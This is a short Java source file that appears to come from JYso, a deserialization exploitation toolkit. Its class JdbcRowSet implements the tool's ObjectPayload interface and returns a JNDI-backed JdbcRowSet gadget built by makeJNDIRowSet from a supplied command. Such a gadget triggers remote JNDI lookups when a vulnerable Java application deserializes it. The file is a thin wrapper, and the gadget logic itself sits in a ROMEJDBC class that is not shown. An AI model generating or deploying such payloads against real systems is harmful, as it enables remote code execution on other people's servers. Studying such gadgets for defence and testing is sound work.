package com.qi4l.JYso.gadgets;

import static com.qi4l.JYso.gadgets.ROMEJDBC.makeJNDIRowSet;

public class JdbcRowSet implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        return makeJNDIRowSet(command);
    }
}